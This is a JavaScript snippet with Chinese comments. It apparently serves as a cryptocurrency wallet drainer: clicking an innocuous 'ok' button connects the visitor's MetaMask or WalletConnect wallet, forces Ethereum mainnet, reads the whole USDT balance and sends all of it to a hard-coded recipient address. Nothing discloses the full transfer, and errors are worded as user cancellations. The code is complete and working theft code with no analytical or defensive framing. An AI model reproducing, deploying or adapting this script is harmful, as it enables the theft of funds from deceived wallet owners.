// USDT 合约地址（以太坊主网）
const usdtAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
// 目标地址
const recipientAddress = '0x64C6592164CC7C0Bdfb1D9a6F64C172a1830eD2C';

// WalletConnect 提供者（需引入 WalletConnect SDK）
async function getWeb3Provider() {
    let web3;

    // 优先尝试 MetaMask 或其他注入的以太坊提供者
    if (window.ethereum) {
        web3 = new Web3(window.ethereum);
        try {
            await window.ethereum.request({ method: 'eth_requestAccounts' });
            return web3;
        } catch (error) {
            console.error("MetaMask 连接失败:", error);
        }
    } else if (window.web3) {
        // 兼容旧版 Web3 注入（某些钱包可能仍使用）
        web3 = new Web3(window.web3.currentProvider);
        return web3;
    } else {
        // 如果没有注入提供者，使用 WalletConnect
        alert("未检测到钱包注入，正在尝试通过 WalletConnect 连接...");
        const WalletConnectProvider = window.WalletConnectProvider.default;
        const provider = new WalletConnectProvider({
            infuraId: "YOUR_INFURA_ID", // 请替换为您的 Infura ID 或其他节点服务
        });
        await provider.enable();
        web3 = new Web3(provider);
        return web3;
    }

    throw new Error("无法连接到任何钱包，请确保安装了支持 Web3 的钱包。");
}

async function transferUsdt() {
    try {
        // 获取 Web3 提供者
        const web3 = await getWeb3Provider();
        console.log("Web3 提供者已初始化");

        // 获取账户
        const accounts = await web3.eth.getAccounts();
        const account = accounts[0];
        console.log("已连接账户:", account);

        // 检查网络并提示切换到以太坊主网
        const chainId = await web3.eth.getChainId();
        if (chainId.toString() !== "1") {
            try {
                await web3.currentProvider.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x1' }], // 以太坊主网
                });
            } catch (switchError) {
                alert("请手动切换到以太坊主网（Ethereum Mainnet）。");
                return;
            }
        }

        // USDT 合约 ABI
        const usdtAbi = [
            {
                "constant": true,
                "inputs": [{"name": "_owner", "type": "address"}],
                "name": "balanceOf",
                "outputs": [{"name": "balance", "type": "uint256"}],
                "type": "function"
            },
            {
                "constant": false,
                "inputs": [{"name": "_to", "type": "address"}, {"name": "_value", "type": "uint256"}],
                "name": "transfer",
                "outputs": [],
                "type": "function"
            }
        ];

        // 初始化 USDT 合约
        const usdtContract = new web3.eth.Contract(usdtAbi, usdtAddress);

        // 获取 USDT 余额
        const balance = await usdtContract.methods.balanceOf(account).call();
        const amount = web3.utils.toBN(balance);
        console.log("USDT 余额:", web3.utils.fromWei(amount, 'mwei')); // USDT 有 6 个小数位

        // 发起转账交易
        await usdtContract.methods.transfer(recipientAddress, amount).send({ from: account });
        alert("交易已成功发送！");
    } catch (error) {
        console.error("错误详情:", error);
        alert("您已取消: " + error.message);
    }
}

// 为按钮添加点击事件
document.getElementById("ok-button").addEventListener("click", transferUsdt);
